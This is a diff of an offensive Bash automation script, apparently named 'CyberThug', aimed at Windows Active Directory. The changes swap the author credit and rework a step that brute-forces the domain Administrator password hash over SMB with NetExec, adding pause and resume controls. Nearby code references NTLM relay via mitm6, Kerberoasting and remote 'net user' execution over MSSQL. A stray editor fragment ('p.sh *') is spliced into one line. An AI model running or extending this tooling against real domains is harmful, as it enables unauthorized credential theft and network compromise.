@@ -1,6 +1,6 @@
 #!/bin/bash
 ########################################
-####  [+]-- Author: OmarSamy --[+]  ####
+####  [+]-- Author: 0x2034   --[+]  ####
 ####   [+]--   CyberThug    --[+]   ####
 ########################################
 
@@ -11,7 +11,7 @@ echo -e "\e[1;32m
            / /___/ /_/ / /_/ /  __/ /   / / / / / / /_/ / /_/ /  
            \____/\__, /_.___/\___/_/   /_/ /_/ /_/\__,_/\__, /  
                 /____/                                 /____/    
-                                                            \e[0m""\e[1;38mOmarSamy\e[0m"
+                                                            \e[0m""\e[1;38m0x2034\e[0m"
 
 getuserspns1_check1(){
       cat << 'EOF' >> /tmp/auto7.sh
@@ -2427,10 +2427,37 @@ echo ''
 exec bash
 "
 gnome-terminal -- bash -c "
-echo -e '\033[36m[+]-- BruteForcing Administrator Hash --[+]\033[0m' 
-echo ''
-nxc smb $DOMAIN -u Administrator -H /usr/share/wordlists/hashes
-exec bash  
+echo -e \"\033[36m[+]-- BruteForcing Administrator Hash --[+]\033[0m\"
+echo \"\"
+cmd=\"nxc smb $DOMAIN -u Administrator -H /usr/share/wordlists/hashes\"
+\$cmd &
+NXC_PID=\$!
+sleep 0.2
+if [ -z \"\$NXC_PID\" ]; then
+  ESCAPED_CMD=\$(printf \"%s\" \"\$cmd\" | sed -e \"s/[][\\\\.\\^\\\$*+?(){}|]/\\\\\\\\&/g\")
+  NXC_PID=\$(pgrep -u \"\$USER\" -f \"\$ESCAPED_CMD\" | head -n1)
+fi
+while true; do
+  echo \"\"
+  echo \"[p]ause  [r]esume  [q]uit\"
+  read -n1 -s key
+  case \"\$key\" in
+    p|P)
+      kill -STOP \$NXC_PID && echo \"[+] Paused\"
+      ;;
+    r|R)
+      kill -CONT \$NXC_PID && echo \"[+] Resumed\"
+      ;;
+    q|Q)
+      kill \$NXC_PID 2>/dev/null 
+      exit 0
+      ;;
+    *)
+      ;;
+  esac
+done
+
+exec bash
 "
 echo ""
 ntlmrelay_mitm6(){
@@ -7138,7 +7165,39 @@ fi
 exec bash
 '
 }
-ntlmrelay_mitm6
+ntlmrelay_mitm6                                                                                                           p.sh *                                                                                                                                         
+cat <<'EOF' > /tmp/admin_brute.sh
+echo -e "\033[36m[+]-- BruteForcing Administrator Hash --[+]\033[0m"
+echo ""
+DOMAIN="__$DOMAIN__"
+cmd="nxc smb $DOMAIN -u Administrator -H /usr/share/wordlists/hashes"
+eval "$cmd &"
+NXC_PID=$!
+sleep 0.2
+if [ -z "$NXC_PID" ]; then
+  ESCAPED_CMD=$(printf '%s' "$cmd" | sed -e 's/[][\.\\^$*+?(){}|]/\\&/g')
+  NXC_PID=$(pgrep -u "$USER" -f "$ESCAPED_CMD" | head -n1 || true)
+fi
+while true; do
+  echo ""
+  echo "[p]ause  [r]esume  [q]uit"
+  read -n1 -s key
+  case "$key" in
+    p|P)
+      kill -STOP $NXC_PID && echo "[+] Paused"
+      ;;
+    r|R)
+      kill -CONT $NXC_PID && echo "[+] Resumed"
+      ;;
+    q|Q)
+      kill $NXC_PID 2>/dev/null
+      exit 0
+      ;;
+    *)
+      ;;
+  esac
+done
+EOF
     echo ""
     cat << EOF > /tmp/auto.sh
 #!/bin/bash
@@ -7347,11 +7406,9 @@ nxc mssql $DOMAIN --local-auth -u $User -p $Password -x "net user" $flag
 echo ""
 exec bash
 '
-echo""
+sed -i "s|__\\\$DOMAIN__|$DOMAIN|g" /tmp/admin_brute.sh
 gnome-terminal -- bash -c "
-echo -e '\033[36m[+]-- BruteForcing Administrator Hash --[+]\033[0m'
-echo ""
-nxc smb $DOMAIN -u Administrator -H /usr/share/wordlists/hashes
+bash /tmp/admin_brute.sh
 exec bash
 "
 echo ""
@@ -8066,5 +8123,4 @@ echo -e "\e[1;32m------------------[+] Finished [+]---------------------\e[0m"
 #      done
 #--------------------------------------
 #    elif [[ "$tool" == "exit" ]]; then
-                                                                           
-                                                                       
+                                                        
